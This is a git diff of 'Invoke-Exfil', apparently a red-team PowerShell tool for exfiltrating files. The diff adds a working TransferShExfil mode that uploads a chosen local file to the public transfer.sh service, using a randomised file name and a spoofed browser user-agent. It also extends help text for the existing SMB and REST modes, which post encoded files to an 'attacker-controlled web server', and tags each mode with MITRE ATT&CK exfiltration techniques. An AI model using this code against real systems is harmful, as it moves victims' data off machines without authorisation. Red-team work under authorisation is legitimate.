@@ -8,8 +8,12 @@ param (
 	[String]$LocalFile,
 	[Switch]$RestExfil,
 	[String]$LocalFile2=[String]$Localfile,
-	[String]$Url
+	[String]$Url,
+	[Switch]$TransferShExfil,
+	[String]$LocalFile3=[String]$LocalFIle
 )
+
+$Rs1 = (-join ((65..90) + (97..122) | Get-Random -Count 16 | foreach {[char]$_}))
 
 	if ($Help -eq $True) {
 		Write @"
@@ -27,7 +31,10 @@ param (
                                                                                 
    [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n 
    [*] Use impacket-smbserver on remote:                                                  
-       impacket-smbserver data /tmp/data -smb2support                           
+       impacket-smbserver data /tmp/data -smb2support 
+	   
+   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
+   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)   
  
  |-----------------------------------------------------------------------------|
  | -RestExfil [-LocalFile] local_file [-Url] remote_server                     |
@@ -36,8 +43,25 @@ param (
    [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
        send a file to an attacker-controlled web server.
 	
-   [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://192.168.1.1/exfil
+   [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
    
+   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
+   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
+   
+ |-----------------------------------------------------------------------------|
+ | -TransferShExfil [-LocalFile] local_file                                    |
+ |-----------------------------------------------------------------------------|
+ 
+   [*] Description: Uploads a file to the https://transfer.sh file upload 
+       service. A URL to the file will be returned and is valid for 14 days. 
+       "Invoke-WebRequest" and PUT is utilized for this function.
+	
+   [*] Usage: Invoke-Exfil -TransferShExfil -LocalFile C:\file
+   
+   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
+   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
+	   
+ |-----------------------------------------------------------------------------|
 
 "@
 	}
@@ -46,8 +70,9 @@ param (
 
  Invoke-Exfil Command List:
  --------------------------
- Invoke-Exfil -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip 
+ Invoke-Exfil -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip
  Invoke-Exfil -RestExfil [-LocalFile] local_file [-Url] remote_server
+ Invoke-Exfil -TransferShExfil [-LocalFile] local_file
 
 "@
 	}
@@ -71,5 +96,21 @@ param (
 			
 			$Request = Invoke-RestMethod $Url -Method Post -Body $EncodedData -Headers $Headers
 		}
-	}	
+	}
+	elseif ($TransferShExfil -and $LocalFIle) {
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write " [!] This function requires PowerShell version greater than 2.0."
+			return
+		}
+		else {
+			$FileName = (-join ((65..90) + (97..122) | Get-Random -Count 16 | foreach {[char]$_}))
+				
+			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
+			$Headers.Add("USER-AGENT", 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
+			
+			$Request = (Invoke-WebRequest -Method Put -infile $LocalFile -Headers $Headers https://transfer.sh/$FileName)
+			
+			Write " `n[+] Link to file; valid for 14 days --> $Request `n"
+		}
+	}
 }
